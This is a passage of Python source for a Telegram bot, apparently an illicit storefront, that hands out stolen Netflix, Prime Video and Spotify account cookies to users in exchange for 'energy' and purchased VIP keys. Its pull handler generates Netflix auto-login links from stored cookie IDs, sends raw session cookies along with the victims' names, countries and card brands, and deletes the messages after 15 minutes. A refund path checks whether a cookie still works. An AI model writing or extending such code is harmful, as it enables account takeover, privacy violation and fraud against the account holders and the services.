        if not raw_cookie or srv != "Netflix": return bot.answer_callback_query(c.id, "❌ No recent Netflix account to verify." if lang=="en" else "❌ لا يوجد حساب نتفليكس أخير للتحقق منه.")
        bot.answer_callback_query(c.id, "⏳ Verifying account deeply..." if lang=="en" else "⏳ جاري فحص الحساب للتحقق من العطل...")

        cookies = load_cookies(raw_cookie)
        res = check_netflix_account(cookies)

        if res and res.get("hold") != "Yes" and res.get("tier") != "Unknown":
            bot.send_message(c.message.chat.id, "❌ <b>Account is WORKING 100%!</b> Do not attempt to abuse the refund system." if lang=="en" else "❌ <b>الحساب يعمل 100%!</b> يرجى عدم إساءة استخدام نظام التعويض.", parse_mode="HTML")
        else:
            with DB_LOCK:
                users_db = load_db(USERS_FILE, {})
                u = process_drip(users_db[uid])
                cost = u.get("last_pull_cost", 0)
                if cost > 0:
                    cap = TIERS.get(u.get("tier", "Free"))["cap"]
                    u["energy"] = min(u["energy"] + cost + (cap*0.1), cap)
                u["last_pull_nf"] = None
                u["total_pulls"] = max(0, u.get("total_pulls", 1) - 1)
                users_db[uid] = u
                save_db(USERS_FILE, users_db)
            
            refund_msg_en = "✅ <b>Verified: Account is dead.</b>\n━━━━━━━━━━━━━━━━━━\nYour energy has been refunded + 10% Bounty!\n\n🔄 <b>You can now go back to the menu and pull again!</b>"
            refund_msg_ar = "✅ <b>تم التحقق: الحساب معطل بالفعل.</b>\n━━━━━━━━━━━━━━━━━━\nتمت استعادة طاقتك + 10% مكافأة إضافية!\n\n🔄 <b>يمكنك الآن العودة للقائمة وسحب حساب جديد!</b>"
            bot.send_message(c.message.chat.id, refund_msg_en if lang=="en" else refund_msg_ar, parse_mode="HTML")
            try: bot.send_message(ADMIN_ID, f"⚠️ <b>Auto-Refund Issued!</b>\nUser <code>{uid}</code> reported a dead account and was successfully refunded.", parse_mode="HTML")
            except: pass

    elif c.data == "redeem_menu": 
        bot.edit_message_text(f"💎 <b>Plans & Pricing / Upgrade Rank:</b>\n━━━━━━━━━━━━━━━━━━\nIf you purchased a key, send:\n<code>/redeem [CODE]</code>\n\n⚡ <i>Powered by OPop 👑</i>" if lang=="en" else f"💎 <b>الخطط والأسعار / ترقية الرتبة:</b>\n━━━━━━━━━━━━━━━━━━\nإذا اشتريت مفتاحاً، أرسل:\n<code>/redeem [CODE]</code>\n\n⚡ <i>Powered by OPop 👑</i>", c.message.chat.id, c.message.message_id, reply_markup=redeem_menu_markup(lang), parse_mode="HTML")
        
    elif c.data == "what_is_key":
        if lang == "en":
            txt = (
                "👑 <b>OPOP VIP RANKS & KEYS</b> 👑\n"
                "Unlock massive limits and fast energy regeneration by upgrading your rank!\n\n"
                "⭐ <b>FREE Rank:</b>\n"
                "├ Cap: 100⚡ | Regen: 10⚡ / 8h\n"
                "└ Pull Cost: Standard\n\n"
                "💎 <b>PRO Rank:</b>\n"
                "├ Cap: 200⚡ | Regen: 20⚡ / 6h\n"
                "└ Pull Cost: Standard\n\n"
                "👑 <b>VIP Rank:</b>\n"
                "├ Cap: 500⚡ | Regen: 30⚡ / 4h\n"
                "└ Pull Cost: Discounted (-10⚡/pull)\n\n"
                "🚀 <b>SUPER Rank:</b>\n"
                "├ Cap: 1000⚡ | Regen: 50⚡ / 2h\n"
                "└ Pull Cost: Max Discount (-20⚡/pull)\n\n"
                "🔑 <i>Keys are special codes purchased from the Admin to instantly upgrade your account forever.</i>"
            )
            m = InlineKeyboardMarkup().add(InlineKeyboardButton("🏠 Back to Plans", callback_data="redeem_menu"))
        else:
            txt = (
                "👑 <b>نظام الرتب ومفاتيح VIP</b> 👑\n"
                "قم بترقية رتبتك لفتح حدود سحب ضخمة وتسريع شحن الطاقة!\n\n"
                "⭐ <b>رتبة المجاني (FREE):</b>\n"
                "├ السعة: 100⚡ | الشحن: 10⚡ / 8 ساعات\n"
                "└ تكلفة السحب: عادية\n\n"
                "💎 <b>رتبة المحترف (PRO):</b>\n"
                "├ السعة: 200⚡ | الشحن: 20⚡ / 6 ساعات\n"
                "└ تكلفة السحب: عادية\n\n"
                "👑 <b>رتبة مميز (VIP):</b>\n"
                "├ السعة: 500⚡ | الشحن: 30⚡ / 4 ساعات\n"
                "└ تكلفة السحب: مخفضة (-10⚡ لكل سحب)\n\n"
                "🚀 <b>رتبة خارق (SUPER):</b>\n"
                "├ السعة: 1000⚡ | الشحن: 50⚡ / ساعتين\n"
                "└ تكلفة السحب: تخفيض أقصى (-20⚡ لكل سحب)\n\n"
                "🔑 <i>المفاتيح عبارة عن رموز خاصة يتم شراؤها من الإدارة لترقية حسابك بشكل دائم.</i>"
            )
            m = InlineKeyboardMarkup().add(InlineKeyboardButton("🏠 الرجوع", callback_data="redeem_menu"))
        bot.edit_message_text(txt, c.message.chat.id, c.message.message_id, reply_markup=m, parse_mode="HTML")
        
    elif c.data == "promo_menu": 
        if lang == "en":
            txt = (
                "🧧 <b>PROMO CODES SYSTEM</b> 🧧\n"
                "━━━━━━━━━━━━━━━━━━\n"
                "Promo codes grant you <b>FREE Energy</b> or <b>Bonus Points</b>! 🎁\n\n"
                "🌟 <i>How to get them?</i>\n"
                "Subscribe to our official channel: @HOPhoxmpd\n"
                "We regularly distribute free promotional codes!\n\n"
                "✍️ <i>To redeem a code, send:</i>\n"
                "<code>/promo [CODE]</code>"
            )
        else:
            txt = (
                "🧧 <b>نظام الرموز الترويجية (Promo)</b> 🧧\n"
                "━━━━━━━━━━━━━━━━━━\n"
                "الرموز الترويجية تمنحك <b>طاقة مجانية</b> أو <b>نقاط مكافأة</b>! 🎁\n\n"
                "🌟 <i>كيف تحصل عليها؟</i>\n"
                "اشترك في قناتنا الرسمية: @HOPhoxmpd\n"
                "نقوم بنشر أكواد مجانية بانتظام!\n\n"
                "✍️ <i>لاستخدام الكود، أرسل:</i>\n"
                "<code>/promo [CODE]</code>"
            )
        bot.edit_message_text(txt, c.message.chat.id, c.message.message_id, reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🏠 Back" if lang=="en" else "🏠 الرجوع", callback_data="more_menu")), parse_mode="HTML")
        
    elif c.data == "ref_link":
        bot_user = bot.get_me().username
        refs_count = users[uid].get("refs", 0) 
        bar = get_progress_bar(refs_count, 15)
        txt_en = (f"💎 <b>𝗘𝗫𝗖𝗟𝗨𝗦𝗜𝗩𝗘 𝗜𝗡𝗩𝗜𝗧𝗘 𝗦𝗬𝗦𝗧𝗘𝗠</b> 💎\n━━━━━━━━━━━━━━━━━━\n🔗 <b>Your Link:</b>\n<code>https://t.me/{bot_user}?start={uid}</code>\n\n📊 <b>𝗥𝗲𝘄𝗮𝗿𝗱 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀:</b>\n┣ <b>Total Invited:</b> [{bar}] {refs_count}/15\n\n<blockquote>💡 <b>𝗛𝗼𝘄 𝗶𝘁 𝘄𝗼𝗿𝗸𝘀:</b>\nInvite a friend = <b>+50⚡ to Reserve Tank!</b>\nHit 15 invites = <b>PRO Rank unlocked forever!</b> 🎉</blockquote>\n━━━━━━━━━━━━━━━━━━\n⚡ <i>Powered by OPop 👑</i>")
        txt_ar = (f"💎 <b>نظام الإحالات الحصري</b> 💎\n━━━━━━━━━━━━━━━━━━\n🔗 <b>رابط الدعوة الخاص بك:</b>\n<code>https://t.me/{bot_user}?start={uid}</code>\n\n📊 <b>تقدم المكافآت:</b>\n┣ <b>إجمالي المدعوين:</b> [{bar}] {refs_count}/15\n\n<blockquote>💡 <b>كيفية العمل:</b>\nقم بدعوة صديق = <b>+50⚡ في الخزان الاحتياطي!</b>\nاجمع 15 إحالة = <b>ترقية دائمة لرتبة PRO!</b> 🎉</blockquote>\n━━━━━━━━━━━━━━━━━━\n⚡ <i>Powered by OPop 👑</i>")
        bot.send_message(c.message.chat.id, txt_en if lang=="en" else txt_ar, parse_mode="HTML")
        
    elif c.data == "daily_bonus":
        effect_msgs = ["⏳ <i>[■■□□□□] Connecting...</i>", "⏳ <i>[■■■■□□] Checking Daily Rewards...</i>", "⏳ <i>[■■■■■■] Done...</i>"]
        for eff in effect_msgs:
            try: bot.edit_message_text(eff, c.message.chat.id, c.message.message_id, parse_mode="HTML"); time.sleep(0.2)
            except Exception: pass
            
        today = datetime.now().strftime("%Y%m%d")
        with DB_LOCK:
            users_db = load_db(USERS_FILE, {})
            if str(users_db[uid].get("last_bonus")) == today: bot.send_message(c.message.chat.id, "❌ <b>Already claimed today! / لقد حصلت على مكافأة اليوم بالفعل!</b>", parse_mode="HTML")
            else:
                users_db[uid]["last_bonus"] = int(today)
                users_db[uid]["points"] += 0.5
                if users_db[uid]["points"] >= 1.0:
                    users_db[uid]["points"] -= 1.0
                    users_db[uid]["energy"] = min(users_db[uid]["energy"] + TIERS.get(users_db[uid]["tier"])["cost_p"], TIERS.get(users_db[uid]["tier"])["cap"])
                    msg_en = (f"🎁 <b>𝗗𝗔𝗜𝗟𝗬 𝗕𝗢𝗡𝗨𝗦 𝗖𝗟𝗔𝗜𝗠𝗘𝗗</b>\n━━━━━━━━━━━━━━━━━━\n💳 <b>Added:</b> +0.5 Pts\n🎯 <b>Milestone Reached:</b> 1.0 Pts converted to <b>+1 Free Pull (Energy Restored)</b>!\n\n⚡ <i>Powered by OPop 👑</i>")
                    msg_ar = (f"🎁 <b>المكافأة اليومية (تم الاستلام)</b>\n━━━━━━━━━━━━━━━━━━\n💳 <b>تمت إضافة:</b> +0.5 نقطة\n🎯 <b>إنجاز:</b> اكتملت 1.0 نقطة وتم شحن طاقتك لـ <b>+1 سحبة مجانية</b>!\n\n⚡ <i>Powered by OPop 👑</i>")
                else: 
                    msg_en = (f"🎁 <b>𝗗𝗔𝗜𝗟𝗬 𝗕𝗢𝗡𝗨𝗦 𝗖𝗟𝗔𝗜𝗠𝗘𝗗</b>\n━━━━━━━━━━━━━━━━━━\n💳 <b>Added:</b> +0.5 Pts\n📊 <b>Current Balance:</b> {users_db[uid]['points']} Pts\n\n<blockquote>💡 <i>Tip: Reach 1.0 Pts to unlock a free pull.</i></blockquote>")
                    msg_ar = (f"🎁 <b>المكافأة اليومية (تم الاستلام)</b>\n━━━━━━━━━━━━━━━━━━\n💳 <b>تمت إضافة:</b> +0.5 نقطة\n📊 <b>الرصيد الحالي:</b> {users_db[uid]['points']} نقطة\n\n<blockquote>💡 <i>تلميح: اجمع 1.0 نقطة للحصول على سحبة مجانية.</i></blockquote>")
                save_db(USERS_FILE, users_db)
                bot.send_message(c.message.chat.id, msg_en if lang == "en" else msg_ar, parse_mode="HTML")
        bot.edit_message_text("➕ <b><i>More Services:</i></b>\n━━━━━━━━━━━━━━━━━━" if lang == "en" else "➕ <b><i>المزيد من الخدمات:</i></b>\n━━━━━━━━━━━━━━━━━━", c.message.chat.id, c.message.message_id, reply_markup=more_services_menu(uid, lang), parse_mode="HTML")
                
    elif c.data == "stock":
        effect_msgs = ["⏳ <i>[■■□□□□] Establishing Secure Connection...</i>", "⏳ <i>[■■■■□□] Fetching Database Keys...</i>", "⏳ <i>[■■■■■■] Decrypting Stock Data...</i>"]
        for eff in effect_msgs:
            try: bot.edit_message_text(eff, c.message.chat.id, c.message.message_id, parse_mode="HTML"); time.sleep(0.2)
            except Exception: pass
            
        s = init_stock()
        nP, nS, nB = len(s['Netflix']['Premium']), len(s['Netflix']['Standard']), len(s['Netflix']['Basic'])
        pP, sP = len(s.get('PrimeVideo', {}).get('Premium', [])), len(s.get('Spotify', {}).get('Premium', []))
        viewers = random.randint(12, 45)
        
        txt_en = (f"📦 <b>𝗟𝗜𝗩𝗘 𝗦𝗧𝗢𝗖𝗞 𝗗𝗔𝗧𝗔𝗕𝗔𝗦𝗘</b>\n━━━━━━━━━━━━━━━━━━\n🎬 <b>Netflix:</b>\n┣ 👑 Premium : [{get_progress_bar(nP)}] <tg-spoiler>{nP}</tg-spoiler>\n┣ ⭐ Standard: [{get_progress_bar(nS)}] <tg-spoiler>{nS}</tg-spoiler>\n┗ 🎯 Basic   : [{get_progress_bar(nB)}] <tg-spoiler>{nB}</tg-spoiler>\n\n🍿 <b>Prime Video:</b>\n┗ 👑 Premium : [{get_progress_bar(pP)}] <tg-spoiler>{pP}</tg-spoiler>\n\n🎵 <b>Spotify:</b>\n┗ 👑 Premium : [{get_progress_bar(sP)}] <tg-spoiler>{sP}</tg-spoiler>\n━━━━━━━━━━━━━━━━━━\n🔥 <i>{viewers} users are viewing this right now...</i>\n⚡ <i>Powered by OPop 👑</i>")
        txt_ar = (f"📦 <b>قاعدة بيانات المخزون (مباشر)</b>\n━━━━━━━━━━━━━━━━━━\n🎬 <b>نتفليكس:</b>\n┣ 👑 مميز (Premium) : [{get_progress_bar(nP)}] <tg-spoiler>{nP}</tg-spoiler>\n┣ ⭐ قياسي (Standard): [{get_progress_bar(nS)}] <tg-spoiler>{nS}</tg-spoiler>\n┗ 🎯 أساسي (Basic)   : [{get_progress_bar(nB)}] <tg-spoiler>{nB}</tg-spoiler>\n\n🍿 <b>برايم فيديو:</b>\n┗ 👑 مميز : [{get_progress_bar(pP)}] <tg-spoiler>{pP}</tg-spoiler>\n\n🎵 <b>سبوتيفاي:</b>\n┗ 🎧 مميز : [{get_progress_bar(sP)}] <tg-spoiler>{sP}</tg-spoiler>\n━━━━━━━━━━━━━━━━━━\n🔥 <i>يوجد حالياً {viewers} مستخدم يتصفحون المخزون...</i>\n⚡ <i>Powered by OPop 👑</i>")
        bot.edit_message_text(txt_en if lang == "en" else txt_ar, c.message.chat.id, c.message.message_id, reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🏠 Main" if lang == "en" else "🏠 العودة للرئيسية", callback_data="main_menu")), parse_mode="HTML")
    
    elif c.data.startswith("srv_"):
        srv = c.data.split("_")[1]
        if srv == "Netflix": bot.edit_message_text("🎬 <b>NETFLIX / Select Tier:</b>\n════════════════════════" if lang == "en" else "🎬 <b>نتفليكس / اختر الجودة:</b>\n════════════════════════", c.message.chat.id, c.message.message_id, reply_markup=netflix_dynamic_menu(lang, users[uid].get("tier", "Free")), parse_mode="HTML")
        else: 
            logo = "🎵" if srv == "Spotify" else "🍿" if srv == "PrimeVideo" else "🔽"
            bot.edit_message_text(f"{logo} <b>{srv}:</b>\n━━━━━━━━━━━━━━━━━━", c.message.chat.id, c.message.message_id, reply_markup=dynamic_pull_menu(lang, srv, users[uid].get("tier", "Free")), parse_mode="HTML")

    elif c.data.startswith("pull_"):
        with DB_LOCK:
            users_db = load_db(USERS_FILE, {})
            u = process_drip(users_db[uid])
            tier = u.get("tier", "Free")
            t_data = get_costs(tier)
            cap_data = TIERS.get(tier, TIERS["Free"])
            
            parts = c.data.split("_")
            srv = parts[1]
            plan = parts[2]
            
            is_free_pull = False
            if u.get("points", 0) >= 1.0: cost = 0; is_free_pull = True
            else:
                if plan == "Premium": cost = t_data["cost_p"]
                elif plan == "Standard": cost = t_data["cost_s"]
                elif plan == "Basic": cost = t_data["cost_b"]
                elif plan == "Dice": cost = t_data["cost_dice"]

            if not u.get("is_admin") and u.get("energy", 0) < cost:
                missing = cost - u.get("energy", 0)
                txt_en = (
                    "🪫 <b>𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗘𝗡𝗘𝗥𝗚𝗬</b>\n"
                    "━━━━━━━━━━━━━━━━━━\n"
                    f"🔴 <b>Required:</b> {cost}⚡ | <b>Available:</b> {int(u.get('energy', 0))}⚡\n"
                    f"⚠️ <b>Missing:</b> {int(missing)}⚡\n\n"
                    "🔄 <b>Action Required:</b>\n"
                    "Your energy is depleted. You can wait for the Auto-Drip system to recharge your account, or choose an option below to recharge instantly.\n\n"
                    "<blockquote>💡 <i>Tip: Upgrading to VIP gives you massive energy caps and cheaper pulls!</i></blockquote>"
                )
                txt_ar = (
                    "🪫 <b>طاقة غير كافية للاستمرار!</b>\n"
                    "━━━━━━━━━━━━━━━━━━\n"
                    f"🔴 <b>المطلوب:</b> {cost}⚡ | <b>المتاح:</b> {int(u.get('energy', 0))}⚡\n"
                    f"⚠️ <b>الناقص:</b> {int(missing)}⚡\n\n"
                    "🔄 <b>إجراء مطلوب:</b>\n"
                    "لقد استنفدت طاقتك الحالية. يمكنك الانتظار حتى يقوم نظام الشحن التلقائي بتعبئة رصيدك، أو استخدام أحد الخيارات أدناه للشحن الفوري.\n\n"
                    "<blockquote>💡 <i>تلميح: الترقية إلى VIP تمنحك سعة طاقة ضخمة وتخفيضات على السحب!</i></blockquote>"
                )
                return bot.send_message(c.message.chat.id, txt_en if lang=="en" else txt_ar, reply_markup=get_limit_markup(lang), parse_mode="HTML")

            stock = init_stock()
            
            if plan == "Dice":
                roll = random.randint(1, 100)
                if roll <= 60: actual_plan = "Basic"
                elif roll <= 80: actual_plan = "Standard"
                elif roll <= 90: actual_plan = "Premium"
                else: actual_plan = "Dead"
                
                if actual_plan == "Dead":
                    if not is_free_pull:
                        u["energy"] -= cost; u["last_pull_cost"] = cost
                        u = process_drip(u) 
                    else: u["points"] -= 1.0; u["last_pull_cost"] = 0
                    users_db[uid] = u; save_db(USERS_FILE, users_db)
                    msg_dead = "💀 <b>BAM! Dead Cookie!</b> 🎲\n━━━━━━━━━━━━━━━━━━\nYou lost the Dice Roll. Better luck next time!" if lang=="en" else "💀 <b>لقد خسرت! كوكيز غير صالح!</b> 🎲\n━━━━━━━━━━━━━━━━━━\nحظ أوفر في المرة القادمة!"
                    return bot.send_message(c.message.chat.id, msg_dead, reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("🏠 Main", callback_data="main_menu")), parse_mode="HTML")
            else: actual_plan = plan

            if not stock.get(srv, {}).get(actual_plan): return bot.send_message(c.message.chat.id, "❌ <b>Out of Stock!</b>" if lang=="en" else "❌ <b>عذراً، نفد المخزون الحالي.</b>", parse_mode="HTML")
                
            acc = stock[srv][actual_plan].pop(0); save_db(STOCK_FILE, stock)
            
            if is_free_pull: u["points"] -= 1.0; u["last_pull_cost"] = 0
            else:
                u["energy"] -= cost; u["last_pull_cost"] = cost
                u = process_drip(u) 
            
            if actual_plan not in ["Unknown", "Dead"]:
                u["total_pulls"] = u.get("total_pulls", 0) + 1
            if srv == "Netflix": u["last_pull_nf"] = acc["raw_clean"]; u["last_pull_srv"] = srv
            users_db[uid] = u; save_db(USERS_FILE, users_db)

        toast_msg = f"✅ SUCCESS: FREE PULL! Points Used." if is_free_pull else (f"✅ SUCCESS: -{cost} Energy Deducted!" if lang == "en" else f"✅ تم السحب بنجاح: تم خصم {cost} من طاقتك!")
        if is_free_pull and lang == "ar": toast_msg = "✅ تم السحب مجاناً عبر نقاط المكافأة!"
        
        try: bot.answer_callback_query(c.id, text=toast_msg, show_alert=False)
        except: pass

        try:
            if srv == "Netflix":
                msg = bot.send_message(c.message.chat.id, f"👑 <b>OPOP V-GOD ENGINE ACTIVE</b> 👑\n━━━━━━━━━━━━━━━━━━\n💵 <b>Status:</b> ✅ عملية ناجحة (تم خصم الطّاقة)\n💥 <i>[انتظر...] جاري التهيئة... [░░░░░░░░░░] 0%</i>" if lang=="ar" else f"👑 <b>OPOP V-GOD ENGINE ACTIVE</b> 👑\n━━━━━━━━━━━━━━━━━━\n💵 <b>Status:</b> ✅ Success (-Energy)\n💥 <i>[Wait...] Initializing... [░░░░░░░░░░] 0%</i>", parse_mode="HTML"); time.sleep(0.3)
                
                bot.edit_message_text(f"👑 <b>OPOP V-GOD ENGINE ACTIVE</b> 👑\n━━━━━━━━━━━━━━━━━━\n💵 <b>Status:</b> ✅ عملية ناجحة\n💥 <i>[انتظر...] اختراق واجهة برمجة التطبيقات... [████░░░░░░] 40%</i>" if lang=="ar" else f"👑 <b>OPOP V-GOD ENGINE ACTIVE</b> 👑\n━━━━━━━━━━━━━━━━━━\n💵 <b>Status:</b> ✅ Success\n💥 <i>[Wait...] Spoofing API... [████░░░░░░] 40%</i>", c.message.chat.id, msg.message_id, parse_mode="HTML")

                tok = generate_nftoken_live(acc.get("nf_id", ""), acc.get("sec_id", ""))
                
                bot.edit_message_text(f"👑 <b>OPOP V-GOD ENGINE ACTIVE</b> 👑\n━━━━━━━━━━━━━━━━━━\n💵 <b>Status:</b> ✅ عملية ناجحة\n💥 <i>[انتظر...] جاري توليد التوكن... [██████████] 100%</i>" if lang=="ar" else f"👑 <b>OPOP V-GOD ENGINE ACTIVE</b> 👑\n━━━━━━━━━━━━━━━━━━\n💵 <b>Status:</b> ✅ Success\n💥 <i>[Wait...] Generating Token... [██████████] 100%</i>", c.message.chat.id, msg.message_id, parse_mode="HTML")

                profs = ", ".join(acc.get("profiles", [])) if acc.get("profiles") else "N/A"
                h_email = hide_email(acc.get('email', 'N/A'))

                pm_raw = acc.get('pay_method', 'N/A')
                cb_raw = acc.get('card_brand', 'Unknown')
                
                if cb_raw != "Unknown" and cb_raw != "N/A" and cb_raw not in pm_raw:
                    display_payment = f"CC ({cb_raw})" if pm_raw.upper() in ["CC", "CREDITCARD", "CRED_CARD"] else f"{pm_raw} ({cb_raw})"
                else: display_payment = pm_raw

                if tok:
                    t_s = urllib.parse.quote(tok, safe='')
                    l_pc = f"https://www.netflix.com/ProfilesGate?nftoken={t_s}"
                    l_ph = f"https://www.netflix.com/unsupported?nftoken={t_s}"
                    l_tv = "https://www.netflix.com/tv2"
                    ls = (f"✅ <i>DIRECT AUTO-LOGIN LINKS:</i>\n🔗 <i>Watch on PC:</i>\n<a href='{l_pc}'>Click Here (PC)</a>\n\n🔗 <i>Watch on Phone:</i>\n<a href='{l_ph}'>Click Here (Phone)</a>\n\n🔗 <i>Watch on TV:</i>\n<a href='https://www.netflix.com/tv2'>Click Here (TV Code)</a>") if lang == "en" else (f"✅ <i>روابط الدخول المباشر:</i>\n🔗 <i>تسجيل الدخول (حاسوب):</i>\n<a href='{l_pc}'>اضغط هنا</a>\n\n🔗 <i>تسجيل الدخول (هاتف):</i>\n<a href='{l_ph}'>اضغط هنا</a>\n\n🔗 <i>تسجيل الدخول (تلفاز):</i>\n<a href='https://www.netflix.com/tv2'>اضغط هنا</a>")
                else: ls = "❌ <b>Auto-login failed.</b>\n<i>(Use raw cookies)</i>" if lang=="en" else "❌ <b>فشل توليد الرابط المباشر.</b>\n<i>(الرجاء استخدام الكوكيز الخام)</i>"

                raw_c = acc.get('raw_clean', 'N/A')
                msg_cookie_en = f"✨ <b>RAW COOKIES</b> ✨\n━━━━━━━━━━━━━━━━━━\n<code><tg-spoiler>{raw_c}</tg-spoiler></code>\n━━━━━━━━━━━━━━━━━━\n⚡ <i>Powered by OPop 👑</i>"
                msg_cookie_ar = f"✨ <b>الكوكيز الخام (RAW)</b> ✨\n━━━━━━━━━━━━━━━━━━\n<code><tg-spoiler>{raw_c}</tg-spoiler></code>\n━━━━━━━━━━━━━━━━━━\n⚡ <i>Powered by OPop 👑</i>"
                cookie_sent_msg = bot.send_message(c.message.chat.id, msg_cookie_en if lang=="en" else msg_cookie_ar, parse_mode="HTML")

                if lang == "en":
                    dt = (f"🎬 <b>NETFLIX {actual_plan.upper()}</b>\n━━━━━━━━━━━━━━━━━━\n┣ 📇 <i>Name:</i> <b>{acc.get('name', 'N/A')}</b>\n┣ ✉️ <i>Email:</i> <tg-spoiler>{h_email}</tg-spoiler>\n┣ 🌍 <i>Country:</i> <b>{acc.get('cc', 'XX')}</b>\n┣ 💳 <i>Payment:</i> <b>{display_payment}</b>\n┣ 📺 <i>Quality:</i> <b>{acc.get('quality', 'UHD')}</b> | 📺 <i>Streams:</i> <b>{acc.get('streams', '4')}</b>\n┗ 👀 <i>Profiles:</i> <b>{profs}</b>\n━━━━━━━━━━━━━━━━━━\n{ls}\n━━━━━━━━━━━━━━━━━━\n⚠️ <i>For security reasons, this data will self-destruct in 15 minutes.</i>\n\n⚡ <i>Powered by OPop 👑</i>")
                else:
                    dt = (f"🎬 <b>NETFLIX {actual_plan.upper()}</b>\n━━━━━━━━━━━━━━━━━━\n┣ 📇 <i>الاسم:</i> <b>{acc.get('name', 'N/A')}</b>\n┣ ✉️ <i>البريد الإلكتروني:</i> <tg-spoiler>{h_email}</tg-spoiler>\n┣ 🌍 <i>الدولة:</i> <b>{acc.get('cc', 'XX')}</b>\n┣ 💳 <i>طريقة الدفع:</i> <b>{display_payment}</b>\n┣ 📺 <i>الجودة:</i> <b>{acc.get('quality', 'UHD')}</b> | 📺 <i>الشاشات:</i> <b>{acc.get('streams', '4')}</b>\n┗ 👀 <i>الملفات الشخصية:</i> <b>{profs}</b>\n━━━━━━━━━━━━━━━━━━\n{ls}\n━━━━━━━━━━━━━━━━━━\n⚠️ <i>تنبيه أمني: سيتم إتلاف هذه البيانات تلقائياً بعد 15 دقيقة لحماية الحساب.</i>\n\n⚡ <i>Powered by OPop 👑</i>")

                try: bot.delete_message(c.message.chat.id, c.message.message_id)
                except: pass
                bot.delete_message(c.message.chat.id, msg.message_id)

                m_back = InlineKeyboardMarkup()
                m_back.row(InlineKeyboardButton("🔄 Pull Again" if lang=="en" else "🔄 سحب آخر", callback_data=f"pull_{srv}_{plan}"), InlineKeyboardButton("⚠️ Report Dead" if lang=="en" else "⚠️ الإبلاغ عن عطل", callback_data="report_bad_account"))
                m_back.add(InlineKeyboardButton("🏠 Back to Main" if lang=="en" else "🏠 العودة للرئيسية", callback_data="main_menu"))

                f_msg = bot.send_message(c.message.chat.id, dt, reply_markup=m_back, disable_web_page_preview=True, parse_mode="HTML")
                threading.Timer(900, auto_delete_msgs, args=[c.message.chat.id, [cookie_sent_msg.message_id, f_msg.message_id]]).start()

            else:
                acc_raw = acc.get("raw_clean", str(acc))
                dt = f"🎬 <b>{srv.upper()} {actual_plan.upper()}</b>\n━━━━━━━━━━━━━━━━━━\n⚠️ <i>For security reasons, this data will self-destruct in 15 minutes.</i>\n\n⚡ <i>Powered by OPop 👑</i>" if lang=="en" else f"🎬 <b>{srv.upper()} {actual_plan.upper()}</b>\n━━━━━━━━━━━━━━━━━━\n⚠️ <i>تنبيه أمني: سيتم إتلاف هذه البيانات تلقائياً بعد 15 دقيقة لحماية الحساب.</i>\n\n⚡ <i>Powered by OPop 👑</i>"
                msg_cookie = f"✨ <b>RAW COOKIES</b> ✨\n━━━━━━━━━━━━━━━━━━\n<code><tg-spoiler>{acc_raw}</tg-spoiler></code>\n━━━━━━━━━━━━━━━━━━\n⚡ <i>Powered by OPop 👑</i>" if lang=="en" else f"✨ <b>الكوكيز الخام (RAW)</b> ✨\n━━━━━━━━━━━━━━━━━━\n<code><tg-spoiler>{acc_raw}</tg-spoiler></code>\n━━━━━━━━━━━━━━━━━━\n⚡ <i>Powered by OPop 👑</i>"
                
                try: bot.delete_message(c.message.chat.id, c.message.message_id)
                except: pass
                
                c_msg = bot.send_message(c.message.chat.id, msg_cookie, parse_mode="HTML")
                m_back = InlineKeyboardMarkup().row(InlineKeyboardButton("🔄 Pull Again" if lang=="en" else "🔄 سحب آخر", callback_data=f"pull_{srv}_{plan}"), InlineKeyboardButton("🏠 Back to Main" if lang=="en" else "🏠 العودة للرئيسية", callback_data="main_menu"))
                f_msg = bot.send_message(c.message.chat.id, dt, reply_markup=m_back, parse_mode="HTML")
                threading.Timer(900, auto_delete_msgs, args=[c.message.chat.id, [c_msg.message_id, f_msg.message_id]]).start()

        except Exception as e:
            with DB_LOCK:
                users_db = load_db(USERS_FILE, {})
                cost = users_db[uid].get("last_pull_cost", 0)
                if cost > 0: users_db[uid]["energy"] = min(users_db[uid]["energy"] + cost, TIERS.get(users_db[uid]["tier"])["cap"])
                users_db[uid]["total_pulls"] = max(0, users_db[uid].get("total_pulls", 1) - 1)
                save_db(USERS_FILE, users_db)
            msg_err = "<blockquote>❌ Network Timeout or API Error.</blockquote>\n<tg-spoiler>Your energy has been automatically refunded!</tg-spoiler>" if lang=="en" else "<blockquote>❌ انتهت مهلة الاتصال أو حدث خطأ في الخادم.</blockquote>\n<tg-spoiler>تمت استعادة طاقتك بنجاح!</tg-spoiler>"
            bot.send_message(c.message.chat.id, msg_err, parse_mode="HTML")

# 🔥 PRO FEATURE 3: SMART SYSTEM MONITOR DAEMON
def system_monitor_daemon():
    while True:
        time.sleep(3600) 
        try:
            if len(init_stock().get("Netflix", {}).get("Premium", [])) < 10: bot.send_message(ADMIN_ID, f"⚠️ <b>LOW STOCK ALERT!</b>\n━━━━━━━━━━━━━━━━━━\nTime to restock!", parse_mode="HTML")
            now_hour = datetime.now().hour
            if now_hour == 0 or now_hour == 12:
                    zip_buffer = BytesIO()
                    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                        for filename in [USERS_FILE, STOCK_FILE, KEYS_FILE, PROMO_FILE, SETTINGS_FILE]:
                            if os.path.exists(filename): zip_file.write(filename, os.path.basename(filename))
                    zip_buffer.seek(0)
                    try: bot.send_document(ADMIN_ID, (f"OPOP_AutoBackup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip", zip_buffer), caption="🛡️ <b>SYSTEM AUTO-BACKUP (12H)</b>", parse_mode="HTML", timeout=60)
                    except: pass
        except: pass

# ==========================================
# 🚀 INFINITY POLLING (V-GOD MAX ULTIMATE)
# ==========================================
if __name__ == "__main__":
    GREEN = '\033[92m'; YELLOW = '\033[93m'; CYAN = '\033[96m'; RED = '\033[91m'; RESET = '\033[0m'
    
    threading.Thread(target=system_monitor_daemon, daemon=True).start()
    
    print(f"\n{CYAN}===================================================={RESET}")
    print(f"{GREEN} 🚀 OPOP STORE BOT IS BOOTING UP... {RESET}")
    print(f"{CYAN}===================================================={RESET}")
    time.sleep(0.5)
    print(f"{YELLOW}[+] Loading OPOP V-GOD Masterpiece Engine ULTIMATE...{RESET}")
    time.sleep(0.5)
    print(f"{YELLOW}[+] Integrating Smart Ecosystem & Gift System...{RESET}")
    time.sleep(0.5)
